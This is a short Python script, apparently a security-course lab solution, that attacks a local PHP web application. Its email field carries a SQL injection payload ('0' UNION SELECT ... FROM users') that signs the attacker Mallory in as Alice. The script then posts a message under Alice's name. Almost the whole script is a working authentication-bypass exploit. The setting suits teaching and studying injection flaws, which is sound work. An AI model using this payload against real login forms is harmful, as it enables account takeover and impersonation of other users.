import os, requests, urllib

PROTOCOL = "http"
HOST = "localhost"
PORT = "8080"
BASE = PROTOCOL + "://" + HOST + ":" + PORT

# Mallory's credentials
mallory = {
    'email': 'mallory@example.com',
    'password': 'pass4mallory'
}

# reset the application
requests.get(BASE + '/reset.php')

# #######  your attack goes here  #######

fake = {
    'email': "0' UNION SELECT 'alice@example.com','Alice',password FROM users where email = 'mallory@example.com",
    'password': 'pass4mallory'
}
with requests.Session() as s:
     # sign-in as mallory (POST request)
     res = s.post(BASE + '/signin.php', data=fake)

     # post a message (GET request)
     res = s.get(BASE + '/post.php', params={'msg': "Got You!"})



# #########################################
